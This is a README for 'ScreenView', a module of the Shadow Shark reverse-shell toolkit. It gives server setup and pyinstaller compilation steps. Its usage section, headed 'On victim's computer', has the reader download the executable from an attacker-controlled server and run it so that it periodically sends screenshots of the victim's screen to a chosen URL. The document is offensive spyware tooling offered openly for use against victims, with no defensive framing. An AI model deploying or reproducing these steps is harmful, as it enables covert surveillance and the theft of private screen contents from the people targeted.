# ScreenView
The <a href="https://github.com/MrSharkSpamBot/ShadowSharkReverseShell">Shadow Shark</a> ScreenView module.

## Installation
### Debian
```
$ sudo apt-get install python3 python3-pip git apache2 php libapache2-mod-php
$ sudo service apache2 start
$ cd /var/www/html/
$ sudo git clone https://github.com/BababooeyHackers/ScreenView.git
$ sudo chown -R www-data:www-data /var/www/html/ScreenView/
$ cd ScreenView/
$ pip3 install -r requirements.txt
```
### Arch
```
$ sudo pacman -S python python-pip git apache php php-apache
$ sudo systemctl start httpd
$ cd /srv/http/
$ sudo git clone https://github.com/BababooeyHackers/ScreenView.git
$ sudo chown -R www-data:www-data /var/www/html/ScreenView/
$ cd ScreenView/
$ pip3 install -r requirements.txt
```

## Usage
### On victim's computer
```
$ curl http://IP/hacks/ScreenView/ScreenView.(exe, app, etc) --output ScreenView.(exe, app, etc)
$ ScreenView.(exe, app, etc) --time (# Minutes) --url (Url to send screenshot to)
```

## Compilation
This module must be compiled on a Linux computer, Windows computer, Wine environment, or MacOS computer.
```
# First install python3 on your Linux computer, Windows computer, Wine environment, or MacOS computer.
$ pip(3) install -r requirements.txt
$ pyinstaller --onefile --icon icon.ico ScreenView.py
